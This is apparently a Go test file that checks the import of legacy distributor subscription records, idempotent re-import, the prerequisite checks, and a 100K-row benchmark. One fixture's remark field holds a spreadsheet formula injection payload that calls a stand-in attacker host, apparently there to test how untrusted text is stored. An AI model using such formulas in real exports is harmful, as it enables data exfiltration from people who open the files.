package store

import (
	"context"
	"fmt"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestImportLegacyDistributorsPreservesStableSubscriptionRenewalsAndHWID(t *testing.T) {
	database := newTestStore(t)
	ctx := context.Background()
	now := time.Date(2026, 8, 26, 12, 0, 0, 0, time.UTC)
	plan, distributor := createDistributorFixture(t, database, now)
	if _, err := database.db.ExecContext(ctx, `
		INSERT INTO orders (id,user_id,plan_id,period,trade_no,original_amount,total_amount,type,status,callback_no,entitlement_expired_at_after,created_at,updated_at)
		VALUES (10, ?, ?, 'monthly', '2026082612000012345678901', 100000, 100000, 1, 3, 'distributor_auto', 1800000000, ?, ?),
		       (11, ?, ?, 'monthly', '2026082612000012345678902', 100000, 100000, 2, 3, 'distributor_auto', 1800000000, ?, ?)
	`, distributor.ID, plan.ID, now.Unix(), now.Unix(), distributor.ID, plan.ID, now.Unix()+1, now.Unix()+1); err != nil {
		t.Fatal(err)
	}
	customer, remark := "迁移客户", "=WEBSERVICE(\"https://attacker.invalid\")"
	deviceModel, ip := "Pixel 7", "203.0.113.10"
	expires := int64(1_800_000_000)
	data := LegacyDistributorsData{
		Subscribers: []LegacyDistributorSubscriber{{
			ID: 100, Email: "dist-2026082612000012345678901@internal.invalid", PasswordHash: "$2y$10$legacy-internal-password-hash-material-placeholder",
			UUID: "11111111-2222-4333-8444-555555555555", GroupID: plan.GroupID, PlanID: plan.ID,
			TransferEnable: 100 * bytesPerGiB, TrafficUpload: 10, TrafficDownload: 20, ExpiredAt: &expires,
			SpeedLimit: 200, DeviceLimit: 3, SubscriptionToken: "12345678901234567890123456789012",
			CreatedAt: now.Unix(), UpdatedAt: now.Unix() + 5,
		}},
		Subscriptions: []LegacyDistributorSubscription{{
			ID: 20, OriginalOrderID: 10, DistributorUserID: distributor.ID, SubscriberUserID: 100,
			CustomerName: &customer, Remark: &remark, ClaimTokenHash: strings.Repeat("a", 64),
			DeliveryStatus: DistributorDeliveryClaimed, SettlementStatus: DistributorSettlementUnsettled,
			HWIDEnabled: true, HWIDLimit: 2, CreatedAt: now.Unix(), UpdatedAt: now.Unix() + 5,
		}},
		OrderLinks: []LegacyDistributorOrderLink{{OrderID: 10, SubscriptionID: 20}, {OrderID: 11, SubscriptionID: 20}},
		HWIDDevices: []LegacyDistributorHWIDDevice{{
			ID: 30, SubscriptionID: 20, HWID: "LEGACYHWID123", DeviceModel: &deviceModel, IPAddress: &ip,
			FirstSeenAt: now.Unix() + 2, LastSeenAt: now.Unix() + 4,
		}},
	}
	input := LegacyDistributorsImport{
		Slice: LegacyDistributorsSlice, SourceSHA256: strings.Repeat("a", 64), SourceSize: 4096,
		Data: data, Checksum: LegacyDistributorsChecksum(data), RollbackBackupPath: "pre-distributors.xbbackup",
		RollbackBackupSHA256: strings.Repeat("b", 64),
	}
	recordLegacyDistributorPrerequisites(t, database, input.SourceSHA256, now)
	report, err := database.ImportLegacyDistributors(ctx, input, now.Add(time.Minute))
	if err != nil {
		t.Fatalf("ImportLegacyDistributors() error = %v", err)
	}
	if report.AlreadyApplied || report.Subscribers.SourceRows != 1 || report.Subscriptions.TargetRows != 1 ||
		report.OrderLinks.TargetRows != 2 || report.HWIDDevices.TargetRows != 1 || report.Subscribers.TargetChecksum != input.Checksum {
		t.Fatalf("import report = %#v", report)
	}
	root, err := database.GetDistributorOrderByTradeNo(ctx, distributor.ID, "2026082612000012345678901", now.Add(time.Minute))
	if err != nil || !root.IsSubscriptionOrigin || root.Subscription.SubscriberUserID != 100 ||
		root.Subscription.SubscriptionToken != data.Subscribers[0].SubscriptionToken || root.Subscription.Remark == nil ||
		*root.Subscription.Remark != remark || len(root.BoundDevices) != 1 || !strings.Contains(root.BoundDevices[0], "LEGACYHWID123") {
		t.Fatalf("imported root = %#v err=%v", root, err)
	}
	renewal, err := database.GetDistributorOrderByTradeNo(ctx, distributor.ID, "2026082612000012345678902", now.Add(time.Minute))
	if err != nil || renewal.IsSubscriptionOrigin || renewal.Subscription.ID != root.Subscription.ID ||
		renewal.Subscription.SubscriptionToken != root.Subscription.SubscriptionToken {
		t.Fatalf("imported renewal = %#v err=%v", renewal, err)
	}
	repeated, err := database.ImportLegacyDistributors(ctx, input, now.Add(2*time.Minute))
	if err != nil || !repeated.AlreadyApplied || !repeated.AppliedAt.Equal(report.AppliedAt) {
		t.Fatalf("idempotent import = %#v err=%v", repeated, err)
	}
}

func TestImportLegacyDistributorsAcceptsVerifiedEmptyDomain(t *testing.T) {
	database := newTestStore(t)
	data := LegacyDistributorsData{}
	input := LegacyDistributorsImport{
		Slice: LegacyDistributorsSlice, SourceSHA256: strings.Repeat("c", 64), SourceSize: 1024,
		Data: data, Checksum: LegacyDistributorsChecksum(data), RollbackBackupPath: "pre-empty-distributors.xbbackup",
		RollbackBackupSHA256: strings.Repeat("d", 64),
	}
	recordLegacyDistributorPrerequisites(t, database, input.SourceSHA256, fixedStoreTime())
	report, err := database.ImportLegacyDistributors(context.Background(), input, fixedStoreTime())
	if err != nil || report.Subscriptions.SourceRows != 0 || report.Subscriptions.TargetRows != 0 {
		t.Fatalf("empty distributor import = %#v err=%v", report, err)
	}
}

func TestImportLegacyDistributorsRejectsMissingOrCrossSnapshotPrerequisites(t *testing.T) {
	database := newTestStore(t)
	input := LegacyDistributorsImport{
		Slice: LegacyDistributorsSlice, SourceSHA256: strings.Repeat("e", 64), SourceSize: 1024,
		Data: LegacyDistributorsData{}, Checksum: LegacyDistributorsChecksum(LegacyDistributorsData{}),
		RollbackBackupPath: "pre-distributors.xbbackup", RollbackBackupSHA256: strings.Repeat("f", 64),
	}
	recordLegacyDistributorPrerequisites(t, database, strings.Repeat("1", 64), fixedStoreTime())
	_, err := database.ImportLegacyDistributors(context.Background(), input, fixedStoreTime())
	if err == nil || !strings.Contains(err.Error(), "same legacy snapshot") {
		t.Fatalf("ImportLegacyDistributors() error = %v", err)
	}
}

func recordLegacyDistributorPrerequisites(t testing.TB, database *Store, sourceSHA256 string, now time.Time) {
	t.Helper()
	for _, slice := range []string{LegacyHumanUsersSlice, LegacyOrdersSlice} {
		if _, err := database.db.Exec(`
			INSERT INTO legacy_migration_runs
			(slice,source_sha256,source_size,rollback_backup_path,rollback_backup_sha256,report_json,applied_at)
			VALUES (?, ?, 1, 'prerequisite.xbbackup', ?, '{}', ?)
		`, slice, sourceSHA256, strings.Repeat("0", 64), now.Unix()); err != nil {
			t.Fatal(err)
		}
	}
}

func BenchmarkImportLegacyDistributors100K(b *testing.B) {
	const rows = 100_000
	now := fixedStoreTime()
	data := LegacyDistributorsData{
		Subscribers:   make([]LegacyDistributorSubscriber, rows),
		Subscriptions: make([]LegacyDistributorSubscription, rows),
		OrderLinks:    make([]LegacyDistributorOrderLink, rows),
	}
	for index := 0; index < rows; index++ {
		subscriberID := int64(1_000_000 + index)
		orderID := int64(2_000_000 + index)
		subscriptionID := int64(3_000_000 + index)
		data.Subscribers[index] = LegacyDistributorSubscriber{
			ID: subscriberID, Email: fmt.Sprintf("legacy-dist-%06d@internal.invalid", index), PasswordHash: "!internal:legacy",
			UUID: fmt.Sprintf("00000000-0000-4000-8000-%012x", subscriberID), PlanID: 1,
			TransferEnable: 100 * bytesPerGiB, SubscriptionToken: fmt.Sprintf("%032x", subscriberID),
			CreatedAt: now.Unix(), UpdatedAt: now.Unix(),
		}
		data.Subscriptions[index] = LegacyDistributorSubscription{
			ID: subscriptionID, OriginalOrderID: orderID, DistributorUserID: 1, SubscriberUserID: subscriberID,
			ClaimTokenHash: fmt.Sprintf("%064x", subscriptionID), DeliveryStatus: DistributorDeliveryPending,
			SettlementStatus: DistributorSettlementUnsettled, HWIDEnabled: true, HWIDLimit: 1,
			CreatedAt: now.Unix(), UpdatedAt: now.Unix(),
		}
		data.OrderLinks[index] = LegacyDistributorOrderLink{OrderID: orderID, SubscriptionID: subscriptionID}
	}
	input := LegacyDistributorsImport{
		Slice: LegacyDistributorsSlice, SourceSHA256: strings.Repeat("7", 64), SourceSize: 128 << 20,
		Data: data, Checksum: LegacyDistributorsChecksum(data), RollbackBackupPath: "benchmark.xbbackup",
		RollbackBackupSHA256: strings.Repeat("8", 64),
	}
	b.ReportAllocs()
	b.ResetTimer()
	for b.Loop() {
		b.StopTimer()
		path := filepath.Join(b.TempDir(), "distributors.db")
		database, err := OpenSQLite("file:" + filepath.ToSlash(path))
		if err != nil {
			b.Fatal(err)
		}
		if err := database.Migrate(context.Background()); err != nil {
			b.Fatal(err)
		}
		plan, distributor := createDistributorFixture(b, database, now)
		if plan.ID != 1 || distributor.ID != 1 {
			b.Fatalf("benchmark fixture ids plan=%d distributor=%d", plan.ID, distributor.ID)
		}
		tx, err := database.db.BeginTx(context.Background(), nil)
		if err != nil {
			b.Fatal(err)
		}
		statement, err := tx.Prepare(`
			INSERT INTO orders (
				id,user_id,plan_id,period,trade_no,original_amount,total_amount,type,status,
				callback_no,entitlement_expired_at_after,created_at,updated_at
			) VALUES (?, ?, ?, 'monthly', ?, 100000, 100000, 1, 3, 'distributor_auto', 1800000000, ?, ?)
		`)
		if err != nil {
			b.Fatal(err)
		}
		for index := 0; index < rows; index++ {
			orderID := int64(2_000_000 + index)
			if _, err := statement.Exec(orderID, distributor.ID, plan.ID, fmt.Sprintf("%025d", orderID), now.Unix(), now.Unix()); err != nil {
				b.Fatal(err)
			}
		}
		if err := statement.Close(); err != nil {
			b.Fatal(err)
		}
		if err := tx.Commit(); err != nil {
			b.Fatal(err)
		}
		recordLegacyDistributorPrerequisites(b, database, input.SourceSHA256, now)
		b.StartTimer()
		report, err := database.ImportLegacyDistributors(context.Background(), input, now.Add(time.Minute))
		b.StopTimer()
		if err != nil || report.Subscriptions.TargetRows != rows || report.OrderLinks.TargetRows != rows {
			_ = database.Close()
			b.Fatalf("ImportLegacyDistributors() report=%#v error=%v", report, err)
		}
		if err := database.Close(); err != nil {
			b.Fatal(err)
		}
		b.StartTimer()
	}
	b.ReportMetric(rows, "subscriptions/op")
}

func fixedStoreTime() time.Time {
	return time.Date(2026, 8, 26, 12, 0, 0, 0, time.UTC)
}
